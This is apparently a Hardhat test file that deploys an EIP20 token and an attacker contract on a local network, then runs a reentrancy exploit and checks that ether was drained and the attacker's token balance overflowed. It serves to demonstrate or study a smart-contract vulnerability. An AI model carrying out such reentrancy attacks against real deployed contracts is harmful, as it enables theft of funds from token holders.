// We import Chai to use its asserting functions here.
const { expect } = require("chai");

describe("Perform a reentrancy attack", function () {

  let Token, Atk, hardhatToken, hardhatAttacker, tokenOwner, attackOwner, addr1, addr2, addrs;
  let initSupply = 10000;

  // Deploy
  before(async function () {
    Token = await ethers.getContractFactory("EIP20");
    Atk = await ethers.getContractFactory("AtkContract");

    [tokenOwner, attackOwner, addr1, addr2, ...addrs] = await ethers.getSigners();

    hardhatToken = await Token.deploy();
    hardhatAttacker = await Atk.deploy();
  });

  describe("Initialize", function () {

    it("Should assign the total supply of tokens to the owner", async function () {
      await hardhatToken.mint(tokenOwner.address, initSupply);
      const ownerBalance = await hardhatToken.balanceOf(tokenOwner.address);
      expect(ownerBalance).to.equal(initSupply);
      expect(await hardhatToken.totalSupply()).to.equal(ownerBalance);
    });

    it("Should assign 300 tokens from Owner to Attacker Contract address", async function () {
      await hardhatToken.transfer(hardhatAttacker.address, 300);
      expect(await hardhatToken.balanceOf(hardhatAttacker.address)).to.equal(300);
      expect(await hardhatToken.balanceOf(tokenOwner.address)).to.equal(initSupply-300);
    });
  
    it("Should assign 10000 WEI to the Token Contract", async function () {
      let wei = 10000;
      await network.provider.send("hardhat_setBalance", [
        hardhatToken.address,
        "0x" + wei.toString(16),
      ]);

      expect(await hardhatToken.getContractBalance()).to.equal(wei);
      expect(await hardhatAttacker.getAttackerContractBalance()).to.equal(0);
    });
  });

  describe("Exploit", function () {

    let maxIter = 3;
    let amount = 250;

    it("Run", async function () {
      await hardhatAttacker.setMaxIter(maxIter);
      await hardhatAttacker.setTargetAndAmount(hardhatToken.address, amount);
      await hardhatAttacker.resetAndRun();
    });
    
    it("Check", async function () {
      expect(await hardhatToken.getContractBalance()).to.lt(10000);
      expect(await hardhatAttacker.getAttackerContractBalance()).to.gt(0);
      expect(await hardhatToken.balanceOf(hardhatAttacker.address)).to.gt(10000000000000);  // Overflow occured
    });
  });
});